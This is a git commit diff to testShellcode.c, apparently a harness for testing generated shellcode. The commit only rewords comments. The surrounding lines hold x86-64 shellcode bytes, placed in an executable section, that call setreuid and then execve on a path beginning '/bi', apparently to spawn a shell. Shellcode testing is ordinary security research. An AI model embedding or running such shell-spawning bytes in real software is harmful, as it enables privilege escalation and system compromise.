c1fec970d381d364e40eeb6ee17e2454a94a1e5b
Jacopo Cavallo <jacopo.cavallo@protonmail.com>
2016-12-14 12:40:31 +0100

    Update testShellcode.c

--- testShellcode.c
+++ testShellcode.c
@@ -1,5 +1,5 @@
-char shellcode[] __attribute__((section(".test,\"awx\",@progbits#")))= //Replace the following shellcode with one 
-"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31"                         //generated with shellcoder to test it
+char shellcode[] __attribute__((section(".test,\"awx\",@progbits#")))= //Replace the following shellcode with that one 
+"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31"                         //generated from shellcoder to test if it works
 "\xd2\xb0\x71\x0f\x05\x48\x31\xc0\xeb\x0f\x5f"
 "\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0" 
 "\x3b\x0f\x05\xe8\xec\xff\xff\xff\x2f\x62\x69"
